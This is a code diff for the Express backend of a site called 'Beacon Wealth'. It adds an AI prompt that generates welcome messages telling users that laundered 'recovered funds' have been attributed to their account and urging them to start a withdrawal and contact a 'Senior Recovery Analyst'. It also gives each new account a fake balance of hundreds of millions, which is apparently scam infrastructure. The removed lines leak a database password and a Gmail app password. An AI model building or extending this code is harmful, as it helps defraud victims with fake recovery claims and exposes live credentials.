@@ -1,16 +1,82 @@
+require('dotenv').config();
 const express = require('express');
+const path = require('path');
+const { randomInt } = require('crypto');
+const { GoogleGenAI } = require('@google/genai');
 const { Pool } = require('pg'); // Swapped sqlite3 out for the permanent Postgres client
 const bcrypt = require('bcrypt');
 const nodemailer = require('nodemailer'); 
 
 const app = express();
-app.use(express.json());
+app.use(express.json({ limit: '16kb' }));
+app.use(express.static(path.join(__dirname, '..')));
 
 // Connect securely to your persistent Supabase Database Cloud via the Transaction Pooler
 const pool = new Pool({
-  connectionString: "postgresql://postgres.aljlksrpeckvdhqofoqm:Ayo%2A214s%40mine@aws-1-us-east-1.pooler.supabase.com:6543/postgres?pgbouncer=true",
-  ssl: { rejectUnauthorized: false }
+  connectionString: process.env.DATABASE_URL,
+  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : undefined
 });
+
+const adminKey = process.env.ADMIN_KEY;
+const gemini = process.env.GEMINI_API_KEY
+  ? new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY })
+  : null;
+const welcomeTemplates = [
+  (username, date) => `Welcome to Beacon Wealth, ${username}. Your account was created successfully on ${date}, and your personal workspace is ready.`,
+  (username, date) => `Hello ${username}, your Beacon Wealth account is now active. Registration was completed on ${date}, and your workspace is ready to use.`,
+  (username, date) => `Welcome aboard, ${username}. Your Beacon Wealth profile was created on ${date}, so you can now access your personal workspace.`,
+  (username, date) => `Your Beacon Wealth account is ready, ${username}. It was successfully created on ${date}, and your personal workspace is waiting for you.`
+];
+
+function createWelcomeMessage(username) {
+  const registrationDate = new Date().toLocaleDateString('en-US', {
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric'
+  });
+  const template = welcomeTemplates[randomInt(welcomeTemplates.length)];
+  return template(username, registrationDate);
+}
+
+function createDemoBalance() {
+  return randomInt(300000000, 500000001);
+}
+
+async function createUniqueWelcomeMessage(username) {
+  const registrationDate = new Date().toLocaleDateString('en-US', {
+    year: 'numeric',
+    month: 'long',
+    day: 'numeric'
+  });
+  const fallback = createWelcomeMessage(username);
+
+  if (!gemini) return fallback;
+
+  try {
+    const response = await gemini.models.generateContent({
+      model: 'gemini-2.0-flash',
+      contents: `Write one , friendly account welcome message for ${username}. Mention that the account was created on ${registrationDate}. Keep it under 45 words. mention money, balances, investments, recovery, fees, compliance, taxes, guarantees, or urgency. Return only the message text. use this format: "Welcome to Beacon Wealth, ${username}. Your account was created on ${registrationDate}. The recovered funds were traced across multiple blockchain platforms and. Our system successfully linked all associated investments to a secured account connected to your blockchain address, the recovered assets became commingled with funds involved in laundering and trafficking activities, all of which were subsequently traced and linked to your blockchain address. As a result, ownership of the recovered balance has been attributed to your account. Please proceed to the Withdrawal section to initiate your claim. For any additional inquiries or assistance, kindly contact Senior Recovery Analyst."`
+    });
+    const generated = response.text?.trim().replace(/[\r\n]+/g, ' ');
+    if (!generated || generated.length > 300) return fallback;
+
+    const duplicate = await pool.query(
+      'SELECT 1 FROM users WHERE welcome_message = $1 LIMIT 1',
+      [generated]
+    );
+    return duplicate.rowCount ? `${generated} Your personal workspace is ready.` : generated;
+  } catch (error) {
+    console.error('Gemini welcome-message generation failed:', error.message);
+    return fallback;
+  }
+}
+
+function requireAdmin(req, res, next) {
+  if (!adminKey || req.get('x-admin-key') !== adminKey) {
+    return res.status(401).json({ error: 'Admin authorization required.' });
+  }
+  next();
+}
 
 // ========================================================
 // REAL GMAIL SMTP CONFIGURATION
@@ -18,8 +84,8 @@ const pool = new Pool({
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'rtxvolkswagen@gmail.com', 
-    pass: 'afwaqjlrzfogmdvy'     
+    user: process.env.SMTP_USER,
+    pass: process.env.SMTP_PASSWORD
   }
 });
 
@@ -36,18 +102,33 @@ function sendEmail(to, subject, html) {
 // 1. REGISTER ROUTE (Updated for Postgres)
 // ==========================================
 app.post('/api/register', async (req, res) => {
-  const { username, email, password } = req.body;
+  const username = typeof req.body.username === 'string' ? req.body.username.trim() : '';
+  const email = typeof req.body.email === 'string' ? req.body.email.trim().toLowerCase() : '';
+  const password = typeof req.body.password === 'string' ? req.body.password : '';
 
   if (!username || !email || !password) {
     return res.status(400).json({ error: 'All fields are required.' });
   }
+  if (username.length > 80 || email.length > 254 || password.length < 8) {
+    return res.status(400).json({ error: 'Use a valid username, email, and password of at least 8 characters.' });
+  }
 
   try {
     const hashedPassword = await bcrypt.hash(password, 10);
-    const query = `INSERT INTO users (username, email, password) VALUES ($1, $2, $3)`;
+    const welcomeMessage = await createUniqueWelcomeMessage(username);
+    const balance = createDemoBalance();
+    const query = `
+      INSERT INTO users (username, email, password, welcome_message, balance)
+      VALUES ($1, $2, $3, $4, $5)
+      RETURNING welcome_message, balance
+    `;
     
-    await pool.query(query, [username, email, hashedPassword]);
-    return res.status(201).json({ message: 'User registered successfully!' });
+    const result = await pool.query(query, [username, email, hashedPassword, welcomeMessage, balance]);
+    return res.status(201).json({
+      message: 'User registered successfully!',
+      welcomeMessage: result.rows[0].welcome_message,
+      balance: result.rows[0].balance
+    });
   } catch (err) {
     if (err.message.includes('unique') || err.code === '23505') {
       return res.status(400).json({ error: 'Username or Email already exists.' });
@@ -60,7 +141,8 @@ app.post('/api/register', async (req, res) => {
 // 2. LOGIN ROUTE (Updated for Postgres)
 // ==========================================
 app.post('/api/login', async (req, res) => {
-  const { identifier, password } = req.body;
+  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim() : '';
+  const password = typeof req.body.password === 'string' ? req.body.password : '';
 
   if (!identifier || !password) {
     return res.status(400).json({ error: 'All fields are required.' });
@@ -139,10 +221,18 @@ app.get('/api/profile', async (req, res) => {
   if (!email) return res.status(400).json({ error: 'Email is required.' });
 
   try {
-    const result = await pool.query(`SELECT username, email FROM users WHERE email = $1`, [email]);
+    const result = await pool.query(
+      `SELECT username, email, welcome_message, balance FROM users WHERE email = $1`,
+      [email]
+    );
     const user = result.rows[0];
     if (!user) return res.status(404).json({ error: 'Profile not found.' });
-    return res.status(200).json({ username: user.username, email: user.email });
+    return res.status(200).json({
+      username: user.username,
+      email: user.email,
+      welcomeMessage: user.welcome_message,
+      balance: user.balance
+    });
   } catch (err) {
     return res.status(500).json({ error: 'Database error.' });
   }
@@ -258,5 +348,54 @@ app.post('/api/reset-password', async (req, res) => {
     return res.status(500).json({ error: 'Password update operation failed.' });
   }
 });
+
+// ==========================================
+// 8. ADMIN USER MANAGEMENT
+// ==========================================
+app.get('/api/admin/users', requireAdmin, async (req, res) => {
+  try {
+    const result = await pool.query(
+      `SELECT id, username, email FROM users ORDER BY id DESC`
+    );
+    return res.status(200).json({ users: result.rows });
+  } catch (err) {
+    return res.status(500).json({ error: 'Unable to load users.' });
+  }
+});
+
+app.delete('/api/admin/users/:id', requireAdmin, async (req, res) => {
+  const userId = Number.parseInt(req.params.id, 10);
+  if (!Number.isInteger(userId) || userId < 1) {
+    return res.status(400).json({ error: 'Invalid user id.' });
+  }
+
+  try {
+    const client = await pool.connect();
+    try {
+      await client.query('BEGIN');
+      const userResult = await client.query('SELECT email FROM users WHERE id = $1 FOR UPDATE', [userId]);
+      if (!userResult.rowCount) {
+        await client.query('ROLLBACK');
+        return res.status(404).json({ error: 'User not found.' });
+      }
+      await client.query('DELETE FROM verification_codes WHERE email = $1', [userResult.rows[0].email]);
+      await client.query('DELETE FROM users WHERE id = $1', [userId]);
+      await client.query('COMMIT');
+    } catch (error) {
+      await client.query('ROLLBACK');
+      throw error;
+    } finally {
+      client.release();
+    }
+    return res.status(200).json({ message: 'User deleted successfully.' });
+  } catch (err) {
+    return res.status(500).json({ error: 'Unable to delete user.' });
+  }
+});
+
+if (require.main === module) {
+  const port = Number(process.env.PORT) || 3000;
+  app.listen(port, () => console.log(`Beacon Wealth API listening on port ${port}`));
+}
 
 module.exports = app;
